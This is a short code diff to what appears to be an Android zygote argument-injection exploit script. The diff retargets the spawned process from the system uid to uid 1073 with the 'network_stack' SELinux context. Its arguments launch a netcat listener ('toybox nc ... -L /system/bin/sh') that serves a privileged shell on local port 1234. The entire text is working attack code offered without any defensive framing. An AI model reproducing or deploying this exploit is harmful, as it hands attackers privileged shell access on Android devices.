@@ -11,8 +11,8 @@ def main():
     # TODO
     args = [
         '--runtime-args',
-        '--setuid=1000',
-        '--setgid=1000',
+        '--setuid=1073',
+        '--setgid=1073',
         '--runtime-flags=2049',
         # this doesn't exist on android 12
         # '--mount-external-full',
@@ -20,7 +20,7 @@ def main():
         '--target-sdk-version=29',
         '--setgroups=3003',
         '--nice-name=runnetcat',
-        '--seinfo=platform:privapp:targetSdkVersion=29:complete',
+        '--seinfo=network_stack:privapp:targetSdkVersion=29:complete',
         '--invoke-with',
         'toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;',
         '--instruction-set=arm',
